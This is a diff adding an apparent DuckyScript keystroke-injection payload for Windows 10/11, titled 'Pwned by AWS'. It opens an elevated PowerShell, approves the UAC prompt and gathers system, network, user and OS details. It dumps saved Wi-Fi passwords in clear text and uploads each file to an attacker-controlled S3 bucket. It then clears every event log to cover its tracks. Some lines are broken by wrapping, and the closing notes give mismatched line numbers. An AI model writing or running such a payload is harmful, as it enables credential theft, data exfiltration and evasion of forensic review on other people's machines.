@@ -1,0 +1,151 @@
+REM Title: Pwned by AWS
+REM Description: System enum and extract to your Amazon Server.
+REM Author: PacManPwn\
+REM Target: Windows 11/10
+
+DELAY 1000
+REM Open the run dialog
+GUI r
+DELAY 500
+
+REM Launch Admin Powershell
+STRING pwsh 
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 2000
+
+REM Approve User Access Control
+ALT y
+DELAY 2000
+
+REM Install AWS CLI in silent mode (no set-up prompts)
+STRING msiexec.exe /i https://awscli.amazonaws.com/AWSCLIV2.msi /quiet /norestart
+DELAY 500
+ENTER
+
+REM Added extra delay to ensure AWS CLI installation is complete
+DELAY 1500 
+
+REM Verify the AWS CLI is available. If not, exit the script.
+STRING if (!(Get-Command aws -ErrorAction SilentlyContinue)) { Write-Output "AWS CLI not found. Exiting."; exit }
+ENTER
+
+REM Match timezone to your AWS default region
+STRING Set-TimeZone -Id "MATCH-TIMEZONE-TO-AWS-BUCKET"
+ENTER
+
+REM Sync to a reliable NTP server for accurate system time
+STRING w32tm /config /manualpeerlist:"pool.ntp.org" /syncfromflags:manual /reliable:YES /update
+ENTER
+DELAY 500
+
+REM Verify your machine's system time is in sync
+STRING w32tm /resync
+ENTER
+DELAY 1000
+
+REM Set AWS CLI Path to the current session (if it's not recognized)
+STRING $env:Path += ";C:\Program Files\Amazon\AWSCLIV2"
+ENTER
+DELAY 1000
+
+REM Set AWS_ACCESS_KEY_ID
+STRING $env:AWS_ACCESS_KEY_ID = "YOUR-ACCESS-KEY-HERE"
+ENTER
+DELAY 500
+
+REM Set AWS SECRET-ACCESS-KEY-HERE
+STRING $env:AWS_SECRET_ACCESS_KEY = "YOUR-SECRET-ACCESS-KEY-HERE"
+ENTER
+DELAY 500
+
+REM Set your AWS default region (i.e. us-east-1)
+STRING $env:AWS_DEFAULT_REGION = "AWS-BUCKET-REGION"
+ENTER
+DELAY 500
+
+REM Create C:\temp\ directory if it doesn't exist for saving collected info
+STRING If (!(Test-Path -Path "C:\temp\")) { New-Item -Path "C:\temp\" -ItemType Directory }
+ENTER
+DELAY 500
+
+REM Enumerate system info and save to a text file
+STRING systeminfo > C:\temp\systeminfo.txt
+ENTER
+DELAY 1000
+
+REM Upload system info to AWS S3 server
+STRING aws s3 cp C:\temp\systeminfo.txt s3://your-aws-bucket-name/systeminfo.txt
+ENTER
+
+REM Enumerate network interfaces and save to a text file
+STRING Get-NetAdapter > C:\temp\netadapter.txt
+ENTER
+DELAY 1000
+
+REM Upload network adapter info to AWS S3 server
+STRING aws s3 cp C:\temp\netadapter.txt s3://your-aws-bucket-name/netadapter.txt
+ENTER
+
+REM Enumerate user info and save to a text file
+STRING whoami > C:\temp\whoami.txt
+ENTER
+DELAY 1000
+
+REM Upload whoami to AWS S3 server
+STRING aws s3 cp C:\temp\whoami.txt s3://your-aws-bucket-name/whoami.txt
+ENTER
+
+REM Enumerate netuser and save to a text file
+STRING net user > C:\temp\netuser.txt
+ENTER
+DELAY 1000
+
+REM Upload user info to AWS S3 server
+STRING aws s3 cp C:\temp\netuser.txt s3://your-aws-bucket-name/netuser.txt
+ENTER
+
+REM Get Operating System details and save to a text file
+STRING Get-WmiObject Win32_OperatingSystem | Select-Object -Property 
+Caption,OSArchitecture,Version > C:\temp\osinfo.txt
+ENTER
+DELAY 1000
+
+REM Upload OS info to AWS S3 server
+STRING aws s3 cp C:\temp\osinfo.txt s3://your-aws-bucket-name/osinfo.txt
+ENTER
+
+REM Enumerate Wi-Fi profiles and save names to a text file in the temp directory
+STRING netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object 
+{ $_.ToString().Split(':')[1].Trim() } > C:\temp\wifi_names.txt
+ENTER
+DELAY 1000
+
+REM Upload Wi-Fi names to AWS S3 server
+STRING aws s3 cp C:\temp\wifi_names.txt s3://your-aws-bucket-name/wifi_names.txt
+ENTER
+
+REM Retrieve passwords for each Wi-Fi profile and save to a text file
+STRING netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $profileName = 
+$_.ToString().Split(':')[1].Trim(); netsh wlan show profile name="$profileName" key=clear | SelectString 'Key Content' } > C:\temp\wifi_passwords.txt
+ENTER
+DELAY 1000
+
+REM Upload Wi-Fi passwords to AWS S3 server
+STRING aws s3 cp C:\temp\wifi_passwords.txt s3://your-aws-bucket-name/wifi_passwords.txt
+ENTER
+
+REM Delete event logs to clean your tracks
+STRING Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }
+ENTER
+DELAY 2000
+
+REM Exit and close the powershell
+STRING exit
+ENTER
+
+
+REM Lines 63, 58, 63 - Be sure to replace 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION', with your appropriate AWS credentials.
+REM Line 34 - Replace Timezone ID to match the timezone for your AWS Region
+REM Adjust directory/file names as you wish
+REM Delays are set for test purposes. Adjust the delays as you would like to optimize the script
